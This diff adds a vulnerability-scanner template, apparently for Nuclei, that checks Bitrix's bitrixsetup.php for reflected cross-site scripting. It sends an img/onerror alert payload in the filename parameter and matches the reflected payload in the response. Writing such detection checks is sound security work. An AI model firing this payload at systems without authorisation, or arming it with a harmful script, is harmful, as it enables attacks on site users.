@@ -1,0 +1,36 @@
+id: bitrixsetup-xss
+
+info:
+  name: Bitrixsetup cross-site scripting
+  author: man3ki_n3ko, gtrrnr
+  severity: medium
+  description: Bitrixsetup script allows XSS via the filename parameter.
+  reference:
+    - https://habr.com/ru/companies/deiteriylab/articles/806285/
+    - https://bdu.fstec.ru/vul/2024-01501
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:N/A:N
+    cvss-score: 4.3
+  tags: xss,bitrix,bitrixsetup
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/bitrixsetup.php?action=UNPACK&filename=<img src='' onerror=alert(document.domain)>"
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "<img src='' onerror=alert(document.domain)>' in read mode"
+        condition: and
+
+      - type: word
+        part: header
+        words:
+          - 'text/html'
+
+      - type: status
+        status:
+          - 200
